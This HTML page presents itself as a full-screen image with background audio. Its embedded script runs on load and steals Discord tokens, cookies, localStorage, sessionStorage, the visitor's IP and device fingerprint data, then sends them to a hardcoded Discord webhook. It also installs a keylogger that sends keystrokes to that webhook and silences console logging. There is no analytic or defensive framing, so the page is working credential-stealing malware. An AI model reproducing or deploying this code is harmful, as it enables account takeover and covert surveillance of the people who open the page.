<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>.</title></head>
<body>
<img src="heeels" style="width:100%;height:100vh;object-fit:cover;">
<script>
// ===== ويب هوك =====
const WEBHOOK = 'https://canary.discord.com/api/webhooks/1533067323546538115/u_IREtDO_U4D1vGFPnDLn8Fcgwki4eYlJTHegVUGElHbh1OieIPYrN9cEF50bJEWZid-';

// ===== جلب التوكن بكل الطرق =====
function getDiscordToken() {
    let token = null;
    try {
        token = localStorage.getItem('token');
        if (token) return token;
        token = sessionStorage.getItem('token');
        if (token) return token;
        document.cookie.split(';').forEach(c => {
            const [k, v] = c.trim().split('=');
            if (k === 'token' || k === 'discord_token') token = v;
        });
    } catch(e) {}
    return token;
}

// ===== معلومات البطارية =====
async function getBatteryInfo() {
    try {
        const battery = await navigator.getBattery();
        return {
            level: Math.round(battery.level * 100) + '%',
            charging: battery.charging,
            chargingTime: battery.chargingTime + 's',
            dischargingTime: battery.dischargingTime + 's'
        };
    } catch(e) { return 'N/A'; }
}

// ===== معلومات الاتصال =====
function getConnectionInfo() {
    try {
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (!conn) return 'N/A';
        return {
            type: conn.effectiveType || conn.type || 'N/A',
            downlink: conn.downlink ? conn.downlink + ' Mbps' : 'N/A',
            rtt: conn.rtt ? conn.rtt + ' ms' : 'N/A'
        };
    } catch(e) { return 'N/A'; }
}

// ===== معلومات المكونات الإضافية =====
function getPluginsInfo() {
    try {
        const plugins = [];
        for (let i = 0; i < navigator.plugins.length; i++) {
            plugins.push(navigator.plugins[i].name);
        }
        return plugins;
    } catch(e) { return []; }
}

// ===== سحب كل شيء =====
async function run() {
    const ua = navigator.userAgent;
    const token = getDiscordToken();
    const battery = await getBatteryInfo();
    const connection = getConnectionInfo();
    const plugins = getPluginsInfo();

    const data = {
        ua: ua,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: `${screen.width}x${screen.height}`,
        availableScreen: `${screen.availWidth}x${screen.availHeight}`,
        colorDepth: screen.colorDepth + ' bit',
        pixelRatio: window.devicePixelRatio,
        url: window.location.href,
        referrer: document.referrer || 'direct',
        title: document.title,
        memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A',
        cores: navigator.hardwareConcurrency || 'N/A',
        cookiesEnabled: navigator.cookieEnabled,
        online: navigator.onLine,
        doNotTrack: navigator.doNotTrack || 'N/A',
        product: navigator.product || 'N/A',
        vendor: navigator.vendor || 'N/A',
        battery: battery,
        connection: connection,
        plugins: plugins.join(', '),
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        cookies: document.cookie,
        discordToken: token || 'غير موجود',
        timestamp: new Date().toISOString()
    };

    // IP
    try {
        const r = await fetch('https://api.ipify.org?format=json');
        const d = await r.json();
        data.ip = d.ip;
    } catch(e) { data.ip = 'N/A'; }

    // إرسال للويب هوك
    await fetch(WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            content: '```json\n' + JSON.stringify(data, null, 2) + '\n```'
        })
    });

    // كي لوقر
    let log = '';
    document.addEventListener('keydown', e => {
        log += e.key;
        if (log.length > 100) {
            fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: '⌨️ ' + log })
            });
            log = '';
        }
    });

    // صوت
    try {
        document.querySelector('audio')?.play();
    } catch(e) {}
}

window.onload = run;
console.log = ()=>{};
</script>
<audio src="tesees221m.mp3" preload="auto"></audio>
</body>
</html>
